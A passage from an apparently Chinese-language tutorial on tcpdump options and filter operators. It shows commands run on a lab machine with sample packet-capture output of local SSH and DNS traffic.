Flags [P.], <span class="built_in">seq</span> 196:552, ack 1, win 501, options [nop,nop,TS val 3749396460 ecr 551091961], length 356</span><br><span class="line">16:52:01.631805 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 2144:2628, ack 1, win 501, options [nop,nop,TS val 3749396461 ecr 551092017], length 484</span><br><span class="line">...</span><br><span class="line">16:52:01.631863 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 2628, win 3446, options [nop,nop,TS val 551092017 ecr 3749396461], length 0</span><br><span class="line">16:52:01.631874 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 2628:3128, ack 1, win 501, options [nop,nop,TS val 3749396461 ecr 551092017], length 500</span><br><span class="line">16:52:01.631914 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 3128, win 3446, options [nop,nop,TS val 551092017 ecr 3749396461], length 0</span><br><span class="line">20 packets captured</span><br><span class="line">24 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="C-限制数据包文件大小"><a href="#C-限制数据包文件大小" class="headerlink" title="-C 限制数据包文件大小"></a>-C 限制数据包文件大小</h3><p>需要配合-w使用。如果数据包超过限制的大小就会生成一个新的文件用来保存数据包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -C 1 -w abc</span></span><br><span class="line">tcpdump: listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">1765 packets captured</span><br><span class="line">1767 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br><span class="line"></span><br><span class="line">root@webb:~<span class="comment"># ls -lh</span></span><br><span class="line">total 7.7M</span><br><span class="line">-rw-r--r-- 1 root root 1009K Jul 19 17:15 abc</span><br><span class="line">-rw-r--r-- 1 root root  980K Jul 19 17:15 abc1</span><br><span class="line">-rw-r--r-- 1 root root  993K Jul 19 17:15 abc2</span><br><span class="line">-rw-r--r-- 1 root root  986K Jul 19 17:15 abc3</span><br><span class="line">-rw-r--r-- 1 root root  979K Jul 19 17:16 abc4</span><br><span class="line">-rw-r--r-- 1 root root  983K Jul 19 17:16 abc5</span><br><span class="line">-rw-r--r-- 1 root root  990K Jul 19 17:16 abc6</span><br><span class="line">-rw-r--r-- 1 root root  861K Jul 19 17:16 abc7</span><br></pre></td></tr></table></figure><h3 id="W-限制写入文件次数"><a href="#W-限制写入文件次数" class="headerlink" title="-W 限制写入文件次数"></a>-W 限制写入文件次数</h3><p>如果限定的文件都写满了以后会从第一个文件开始写。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~/test<span class="comment"># tcpdump -C 1 -W 3 -w test</span></span><br><span class="line">tcpdump: listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">^C1882 packets captured</span><br><span class="line">1885 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br><span class="line"></span><br><span class="line">root@webb:~/test<span class="comment"># ls -lh</span></span><br><span class="line">total 2.1M</span><br><span class="line">-rw-r--r-- 1 root root  123K Jul 19 17:23 test0</span><br><span class="line">-rw-r--r-- 1 root root 1011K Jul 19 17:23 test1</span><br><span class="line">-rw-r--r-- 1 root root  979K Jul 19 17:23 test2</span><br></pre></td></tr></table></figure><h3 id="Q-选择输入或输出方向的数据"><a href="#Q-选择输入或输出方向的数据" class="headerlink" title="-Q 选择输入或输出方向的数据"></a>-Q 选择输入或输出方向的数据</h3><p>参数：in out inout。</p><ul><li>输入（下载）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -Q in</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">17:58:53.985215 IP 192.168.111.1.43848 &gt; webb.ssh: Flags [.], ack 3183598209, win 648, options [nop,nop,TS val 555104219 ecr 2635667664], length 0</span><br><span class="line">17:58:54.021439 IP _gateway.domain &gt; webb.51745: 10421 NXDomain 0/0/0 (46)</span><br><span class="line">17:58:54.060765 IP _gateway.domain &gt; webb.41578: 23900 NXDomain 0/0/0 (44)</span><br><span class="line">17:58:54.061448 IP 192.168.111.1.43848 &gt; webb.ssh: Flags [.], ack 197, win 648, options [nop,nop,TS val 555104295 ecr 2635667740], length 0</span><br><span class="line">17:58:54.072872 IP 192.168.111.1.34450 &gt; 239.255.255.250.1900: UDP, length 173</span><br><span class="line">17:58:54.109763 IP _gateway.domain &gt; webb.40561: 33080 NXDomain 0/0/0 (44)</span><br><span class="line">...</span><br><span class="line">12057 packets captured</span><br><span class="line">24298 packets received by filter</span><br><span class="line">155 packets dropped by kernel</span><br></pre></td></tr></table></figure><ul><li>输出（上传）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -Q out</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">18:00:37.877483 IP webb.ssh &gt; 192.168.111.1.43848: Flags [P.], <span class="built_in">seq</span> 3185769101:3185769217, ack 36164978, win 501, options [nop,nop,TS val 2635771556 ecr 555208041], length 116</span><br><span class="line">18:00:37.877730 IP webb.ssh &gt; 192.168.111.1.43848: Flags [P.], <span class="built_in">seq</span> 116:152, ack 1, win 501, options [nop,nop,TS val 2635771557 ecr 555208108], length 36</span><br><span class="line">18:00:37.877873 IP webb.ssh &gt; 192.168.111.1.43848: Flags [P.], <span class="built_in">seq</span> 152:268, ack 1, win 501, options [nop,nop,TS val 2635771557 ecr 555208108], length 116</span><br><span class="line">18:00:37.877985 IP webb.ssh &gt; 192.168.111.1.43848: Flags [P.], <span class="built_in">seq</span> 268:304, ack 1, win 501, options [nop,nop,TS val 2635771557 ecr 555208108], length 36</span><br><span class="line">18:00:37.878707 IP webb.49487 &gt; _gateway.domain: 20848+ PTR? 1.111.168.192.in-addr.arpa. (44)</span><br><span class="line">...</span><br><span class="line">1636 packets captured</span><br><span class="line">3248 packets received by filter</span><br><span class="line">9 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="q-显示简洁的信息"><a href="#q-显示简洁的信息" class="headerlink" title="-q 显示简洁的信息"></a>-q 显示简洁的信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -q </span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">18:11:47.861165 IP webb.ssh &gt; 192.168.111.1.43848: tcp 196</span><br><span class="line">18:11:47.861317 IP 192.168.111.1.43848 &gt; webb.ssh: tcp 0</span><br><span class="line">18:11:47.862202 IP webb.51236 &gt; _gateway.domain: UDP, length 44</span><br><span class="line">18:11:47.883263 IP _gateway.domain &gt; webb.51236: UDP, length 44</span><br><span class="line">18:11:47.884388 IP webb.60867 &gt; _gateway.domain: UDP, length 46</span><br><span class="line">18:11:47.913492 IP _gateway.domain &gt; webb.60867: UDP, length 46</span><br><span class="line">18:11:47.914114 IP webb.ssh &gt; 192.168.111.1.43848: tcp 164</span><br><span class="line">18:11:47.914307 IP 192.168.111.1.43848 &gt; webb.ssh: tcp 0</span><br><span class="line">18:11:47.914471 IP webb.36870 &gt; _gateway.domain: UDP, length 44</span><br><span class="line">18:11:47.943661 IP _gateway.domain &gt; webb.36870: UDP, length 44</span><br><span class="line">18:11:47.945832 IP webb.ssh &gt; 192.168.111.1.43848: tcp 308</span><br><span class="line">...</span><br><span class="line">1662 packets captured</span><br><span class="line">1662 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="D-显示可以用的网卡"><a href="#D-显示可以用的网卡" class="headerlink" title="-D 显示可以用的网卡"></a>-D 显示可以用的网卡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -D</span></span><br><span class="line">1.ens32 [Up, Running]</span><br><span class="line">2.docker0 [Up, Running]</span><br><span class="line">3.veth718d71e [Up, Running]</span><br><span class="line">4.lo [Up, Running, Loopback]</span><br><span class="line">5.any (Pseudo-device that captures on all interfaces) [Up, Running]</span><br><span class="line">6.br-2c5c2f3c07b0 [Up]</span><br><span class="line">7.br-8176041516e6 [Up]</span><br><span class="line">8.br-78e4c3004a16 [Up]</span><br><span class="line">9.br-653aa4c4ca24 [Up]</span><br><span class="line">10.br-0b50877f0c80 [Up]</span><br><span class="line">11.br-4a5364f0c91e [Up]</span><br><span class="line">12.br-65553a1d414f [Up]</span><br><span class="line">13.br-b2f360fdd976 [Up]</span><br><span class="line">14.br-388fed18724d [Up]</span><br><span class="line">15.br-67a000c23451 [Up]</span><br><span class="line">16.br-4c01ac860111 [Up]</span><br><span class="line">17.br-aa15e7478112 [Up]</span><br><span class="line">18.bluetooth-monitor (Bluetooth Linux Monitor) [none]</span><br><span class="line">19.nflog (Linux netfilter <span class="built_in">log</span> (NFLOG) interface) [none]</span><br><span class="line">20.nfqueue (Linux netfilter queue (NFQUEUE) interface) [none]</span><br></pre></td></tr></table></figure><h3 id="L-显示某个网卡已只数据链路信息"><a href="#L-显示某个网卡已只数据链路信息" class="headerlink" title="-L 显示某个网卡已只数据链路信息"></a>-L 显示某个网卡已只数据链路信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -L</span></span><br><span class="line">Data <span class="built_in">link</span> types <span class="keyword">for</span> ens32 (use option -y to <span class="built_in">set</span>):</span><br><span class="line">  EN10MB (Ethernet)</span><br><span class="line">  DOCSIS (DOCSIS) (printing not supported)</span><br></pre></td></tr></table></figure><h3 id="S-指定每个数据包的长度"><a href="#S-指定每个数据包的长度" class="headerlink" title="-S 指定每个数据包的长度"></a>-S 指定每个数据包的长度</h3><p>如果超过设定的大小限制，数据包会被截断，而每行会出现[|协议]这种标识。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -s 50</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 50 bytes</span><br><span class="line">03:25:19.730692 IP webb.ssh &gt; 192.168.111.1.43848: [|tcp]</span><br><span class="line">03:25:19.730844 IP 192.168.111.1.43848 &gt; webb.ssh: [|tcp]</span><br><span class="line">03:25:19.730854 IP webb.ssh &gt; 192.168.111.1.43848: [|tcp]</span><br><span class="line">03:25:19.730912 IP 192.168.111.1.43848 &gt; webb.ssh: [|tcp]</span><br><span class="line">03:25:19.730949 IP webb.ssh &gt; 192.168.111.1.43848: [|tcp]</span><br><span class="line">03:25:19.731011 IP 192.168.111.1.43848 &gt; webb.ssh: [|tcp]</span><br><span class="line">03:25:19.731511 IP webb.53133 &gt; _gateway.domain: [|domain]</span><br><span class="line">03:25:19.758616 IP _gateway.domain &gt; webb.53133: [|domain]</span><br><span class="line">...</span><br><span class="line">2331 packets captured</span><br><span class="line">2333 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="A-数据包的信息用ASCII字符串显示"><a href="#A-数据包的信息用ASCII字符串显示" class="headerlink" title="-A 数据包的信息用ASCII字符串显示"></a>-A 数据包的信息用ASCII字符串显示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -A </span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">03:29:41.935419 IP webb.ssh &gt; 192.168.111.1.43848: Flags [P.], <span class="built_in">seq</span> 3187380677:3187380873, ack 36172546, win 501, options [nop,nop,TS val 2637269641 ecr 556706107], length 196</span><br><span class="line">E.....@.@..)..o...o....H.....<span class="string">&#x27;......`......</span></span><br><span class="line"><span class="string">.1..!..;.....;.....y.X........E...&#125;+..O1..rA.L..[       .6...&lt;p..*.........f?&#x27;</span>CZ...N..;...).X.Su;.`......ZNX...:.RDxJ..&gt;D.uZ8...!...A./.......V.?......j9....)......U.X6..B&gt;E=e..[^....X..<span class="string">&#x27;].&gt;M..&amp;.d...&amp;.....m....</span></span><br><span class="line"><span class="string">03:29:41.935548 IP 192.168.111.1.43848 &gt; webb.ssh: Flags [.], ack 196, win 12278, options [nop,nop,TS val 556706161 ecr 2637269641], length 0</span></span><br><span class="line"><span class="string">E..4\.@.@.~9..o...o..H...&#x27;</span>......../........</span><br><span class="line">!..q.1..</span><br><span class="line">03:29:41.936377 IP webb.33513 &gt; _gateway.domain: 6457+ PTR? 1.111.168.192.in-addr.arpa. (44)</span><br><span class="line">E..H6.@.@.....o...o....5.4`..9...........1.111.168.192.in-addr.arpa.....</span><br><span class="line">3 packets captured</span><br><span class="line">13 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="X-数据包的信息用十六进制和ASCII字符串显示"><a href="#X-数据包的信息用十六进制和ASCII字符串显示" class="headerlink" title="-X 数据包的信息用十六进制和ASCII字符串显示"></a>-X 数据包的信息用十六进制和ASCII字符串显示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -X </span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">03:32:53.459045 IP webb.ssh &gt; 192.168.111.1.43848: Flags [P.], <span class="built_in">seq</span> 3187382901:3187383097, ack 36173466, win 501, options [nop,nop,TS val 2637461164 ecr 556897624], length 196</span><br><span class="line">        0x0000:  4510 00f8 2f0f 4000 4006 ab0d c0a8 6f81  E.../.@.@.....o.</span><br><span class="line">        0x0010:  c0a8 6f01 0016 ab48 bdfb 9a75 0227 f69a  ..o....H...u.<span class="string">&#x27;..</span></span><br><span class="line"><span class="string">        0x0020:  8018 01f5 60be 0000 0101 080a 9d34 76ac  ....`........4v.</span></span><br><span class="line"><span class="string">        0x0030:  2131 9558 0000 00b0 cce9 d735 79ce 5a55  !1.X.......5y.ZU</span></span><br><span class="line"><span class="string">        0x0040:  9f4b 8734 e72f d4f1 a980 261f f5b6 c1bb  .K.4./....&amp;.....</span></span><br><span class="line"><span class="string">        0x0050:  0294 1623 1ddf 77ff 9a52 1714 8b60 6206  ...#..w..R...`b.</span></span><br><span class="line"><span class="string">        0x0060:  50ef e4d4 3eb3 1a99 dff8 8eaf 6edd 8d70  P...&gt;.......n..p</span></span><br><span class="line"><span class="string">        0x0070:  ed4c 257d 2837 cd81 449c f9ea 2569 6fa5  .L%&#125;(7..D...%io.</span></span><br><span class="line"><span class="string">        0x0080:  f6df 019c c77c 0b5c cf27 662f 787f 53c3  .....|.\.&#x27;</span>f/x.S.</span><br><span class="line">        0x0090:  64e0 239f cd91 8d20 bd18 a5b0 76eb 0750  d.<span class="comment">#.........v..P</span></span><br><span class="line">        0x00a0:  190f 1c22 7330 d317 3d68 7068 4cb6 767c  ...<span class="string">&quot;s0..=hphL.v|</span></span><br><span class="line"><span class="string">        0x00b0:  11b4 4a41 0547 1411 f6b1 8783 9dc3 ec63  ..JA.G.........c</span></span><br><span class="line"><span class="string">        0x00c0:  38f1 00fb c79b 4bec c243 e609 944e f0e2  8.....K..C...N..</span></span><br><span class="line"><span class="string">        0x00d0:  f765 3af6 428f 4773 9d1c b8e4 37aa 279f  .e:.B.Gs....7.&#x27;.</span></span><br><span class="line"><span class="string">        0x00e0:  a9d5 06fd 9d62 49aa c640 7fbd 1c6c 2035  .....bI..@...l.5</span></span><br><span class="line"><span class="string">        0x00f0:  bbb3 4abf 1a3c b009                      ..J..&lt;..</span></span><br><span class="line"><span class="string">03:32:53.459186 IP 192.168.111.1.43848 &gt; webb.ssh: Flags [.], ack 196, win 12293, options [nop,nop,TS val 556897684 ecr 2637461164], length 0</span></span><br><span class="line"><span class="string">        0x0000:  4500 0034 5ce9 4000 4006 7e07 c0a8 6f01  E..4\.@.@.~...o.</span></span><br><span class="line"><span class="string">        0x0010:  c0a8 6f81 ab48 0016 0227 f69a bdfb 9b39  ..o..H...&#x27;.....9</span></span><br><span class="line"><span class="string">        0x0020:  8010 3005 1ee8 0000 0101 080a 2131 9594  ..0.........!1..</span></span><br><span class="line"><span class="string">        0x0030:  9d34 76ac                                .4v.</span></span><br><span class="line"><span class="string">03:32:53.459848 IP webb.46115 &gt; _gateway.domain: 9560+ PTR? 1.111.168.192.in-addr.arpa. (44)</span></span><br><span class="line"><span class="string">        0x0000:  4500 0048 722f 4000 4011 68a1 c0a8 6f81  E..Hr/@.@.h...o.</span></span><br><span class="line"><span class="string">        0x0010:  c0a8 6f02 b423 0035 0034 601a 2558 0100  ..o..#.5.4`.%X..</span></span><br><span class="line"><span class="string">        0x0020:  0001 0000 0000 0000 0131 0331 3131 0331  .........1.111.1</span></span><br><span class="line"><span class="string">        0x0030:  3638 0331 3932 0769 6e2d 6164 6472 0461  68.192.in-addr.a</span></span><br><span class="line"><span class="string">        0x0040:  7270 6100 000c 0001                      rpa.....</span></span><br><span class="line"><span class="string">3 packets captured</span></span><br><span class="line"><span class="string">15 packets received by filter</span></span><br><span class="line"><span class="string">0 packets dropped by kernel</span></span><br></pre></td></tr></table></figure><h3 id="e-显示数据链路层的头部信息（MAC地址、VLAN-tag信息）"><a href="#e-显示数据链路层的头部信息（MAC地址、VLAN-tag信息）" class="headerlink" title="-e 显示数据链路层的头部信息（MAC地址、VLAN tag信息）"></a>-e 显示数据链路层的头部信息（MAC地址、VLAN tag信息）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -e </span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">03:36:06.230854 00:0c:29:6b:19:3c (oui Unknown) &gt; 00:50:56:c0:00:08 (oui Unknown), ethertype IPv4 (0x0800), length 262: webb.ssh &gt; 192.168.111.1.43848: Flags [P.], <span class="built_in">seq</span> 3187386301:3187386497, ack 36174278, win 501, options [nop,nop,TS val 2637653936 ecr 557090387], length 196</span><br><span class="line">03:36:06.230950 00:50:56:c0:00:08 (oui Unknown) &gt; 00:0c:29:6b:19:3c (oui Unknown), ethertype IPv4 (0x0800), length 66: 192.168.111.1.43848 &gt; webb.ssh: Flags [.], ack 196, win 12315, options [nop,nop,TS val 557090454 ecr 2637653936], length 0</span><br><span class="line">03:36:06.231603 00:0c:29:6b:19:3c (oui Unknown) &gt; 00:50:56:f3:ae:21 (oui Unknown), ethertype IPv4 (0x0800), length 86: webb.40574 &gt; _gateway.domain: 36789+ PTR? 1.111.168.192.in-addr.arpa. (44)</span><br><span class="line">3 packets captured</span><br><span class="line">10 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="F-使用文件中的过滤规则"><a href="#F-使用文件中的过滤规则" class="headerlink" title="-F 使用文件中的过滤规则"></a>-F 使用文件中的过滤规则</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># cat filter_rule </span></span><br><span class="line">tcp port 80</span><br><span class="line"></span><br><span class="line">root@webb:~<span class="comment"># tcpdump -F filter_rule -i ens32</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">03:43:06.217104 IP webb.43088 &gt; 120.41.45.103.http: Flags [S], <span class="built_in">seq</span> 1123306280, win 64240, options [mss 1460,sackOK,TS val 278585417 ecr 0,nop,wscale 7], length 0</span><br><span class="line">03:43:06.246672 IP 120.41.45.103.http &gt; webb.43088: Flags [S.], <span class="built_in">seq</span> 2338310987, ack 1123306281, win 64240, options [mss 1460], length 0</span><br><span class="line">03:43:06.246733 IP webb.43088 &gt; 120.41.45.103.http: Flags [.], ack 1, win 64240, length 0</span><br><span class="line">03:43:06.246819 IP webb.43088 &gt; 120.41.45.103.http: Flags [P.], <span class="built_in">seq</span> 1:75, ack 1, win 64240, length 74: HTTP: GET /VersionControl.dat HTTP/1.1</span><br><span class="line">03:43:06.246999 IP 120.41.45.103.http &gt; webb.43088: Flags [.], ack 75, win 64240, length 0</span><br><span class="line">03:43:06.286821 IP 120.41.45.103.http &gt; webb.43088: Flags [P.], <span class="built_in">seq</span> 1:1049, ack 75, win 64240, length 1048: HTTP: HTTP/1.1 200 OK</span><br><span class="line">03:43:06.286897 IP webb.43088 &gt; 120.41.45.103.http: Flags [.], ack 1049, win 63928, length 0</span><br><span class="line">...</span><br><span class="line">14 packets captured</span><br><span class="line">18 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="l-对标准输出进行行缓冲（标准输出遇到一个换行符就马上把这行的内容打印出来）。"><a href="#l-对标准输出进行行缓冲（标准输出遇到一个换行符就马上把这行的内容打印出来）。" class="headerlink" title="-l 对标准输出进行行缓冲（标准输出遇到一个换行符就马上把这行的内容打印出来）。"></a>-l 对标准输出进行行缓冲（标准输出遇到一个换行符就马上把这行的内容打印出来）。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -l | tee data</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">03:49:41.850910 IP webb.ssh &gt; 192.168.111.1.43848: Flags [P.], <span class="built_in">seq</span> 3188656729:3188656925, ack 36189394, win 501, options [nop,nop,TS val 2638469556 ecr 557905972], length 196</span><br><span class="line">03:49:41.851026 IP 192.168.111.1.43848 &gt; webb.ssh: Flags [.], ack 196, win 12791, options [nop,nop,TS val 557906030 ecr 2638469556], length 0</span><br><span class="line">03:49:42.839861 IP webb.51943 &gt; _gateway.domain: 14084+ PTR? 1.111.168.192.in-addr.arpa. (44)</span><br><span class="line">03:49:42.865887 IP _gateway.domain &gt; webb.51943: 14084 NXDomain 0/0/0 (44)</span><br><span class="line">03:49:42.868939 IP webb.50062 &gt; _gateway.domain: 8041+ PTR? 129.111.168.192.in-addr.arpa. (46)</span><br><span class="line">03:49:42.897498 IP _gateway.domain &gt; webb.50062: 8041 NXDomain 0/0/0 (46)</span><br><span class="line">03:49:42.900392 IP webb.ssh &gt; 192.168.111.1.43848: Flags [P.], <span class="built_in">seq</span> 196:552, ack 1, win 501, options [nop,nop,TS val 2638470606 ecr 557906030], length 356</span><br><span class="line">03:49:42.901005 IP 192.168.111.1.43848 &gt; webb.ssh: Flags [.], ack 552, win 12791, options [nop,nop,TS val 557907080 ecr 2638470606], length 0</span><br><span class="line">03:49:42.902050 IP webb.ssh &gt; 192.168.111.1.43848: Flags [P.], <span class="built_in">seq</span> 552:588, ack 1, win 501, options [nop,nop,TS val 2638470607 ecr 557907080], length 36</span><br><span class="line">03:49:42.902402 IP 192.168.111.1.43848 &gt; webb.ssh: Flags [.], ack 588, win 12791, options [nop,nop,TS val 557907082 ecr 2638470607], length 0</span><br><span class="line">10 packets captured</span><br><span class="line">17 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><h3 id="and-x2F-amp-amp-满足所有条件"><a href="#and-x2F-amp-amp-满足所有条件" class="headerlink" title="and&#x2F;&amp;&amp; 满足所有条件"></a>and&#x2F;&amp;&amp; 满足所有条件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump src 192.168.1.1 and port 80</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">03:53:43.308323 IP gw.gcableconfig.local.http &gt; webb.49650: Flags [S.], <span class="built_in">seq</span> 1487312683, ack 4054784189, win 64240, options [mss 1460], length 0</span><br><span class="line">03:53:43.308918 IP gw.gcableconfig.local.http &gt; webb.49650: Flags 